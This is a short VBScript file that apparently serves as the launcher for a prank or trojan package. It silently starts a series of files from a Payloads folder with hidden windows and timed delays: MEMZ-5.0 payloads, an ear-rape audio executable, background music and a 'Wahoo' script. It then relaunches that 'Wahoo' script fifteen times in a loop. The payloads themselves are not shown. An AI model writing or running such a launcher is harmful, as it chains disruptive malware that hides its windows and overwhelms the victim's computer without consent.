set ws = CreateObject("WScript.Shell")

wscript.sleep 1000
ws.Run "wscript .\Payloads\Wahoo\WahooStart.vbs", 0
wscript.sleep 2500
ws.Run "wscript .\Payloads\MEMZ-5.0\Single_MEMZPayloads.vbs", 0
wscript.sleep 1500
ws.Run ".\Payloads\Earrape\Earrape_EXTERNAL.exe", 0
wscript.sleep 6600
ws.Run "wscript .\Payloads\PlayBGM\PlayBGM.vbs", 0
wscript.sleep 1500
i=0
do
ws.Run "wscript .\Payloads\Wahoo\WahooStart.vbs", 0
i=i+1
loop while i<>15